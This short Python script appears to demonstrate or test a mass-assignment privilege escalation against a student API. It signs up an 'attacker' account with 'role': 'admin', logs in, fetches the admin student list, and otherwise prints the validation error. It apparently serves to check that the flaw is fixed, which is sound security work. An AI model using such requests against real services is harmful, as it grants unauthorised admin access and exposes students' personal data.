import httpx
from client import BASE, login

new = {
    "name": "attacker",
    "email": "attacker@example.com",
    "password": "attacker-demo-pass",
    "role": "admin",
}
r = httpx.post(f"{BASE}/students", json=new)
if r.is_success:
    print("sign up", r.status_code, "role", r.json()["role"])
    headers = login("attacker@example.com", "attacker-demo-pass")
    r = httpx.get(f"{BASE}/admin/students", headers=headers)
    print("admin list", r.status_code, len(r.json()), "students")
else:
    problem = r.json()["error"]["fields"][0]["problem"]
    print("sign up", r.status_code, problem)
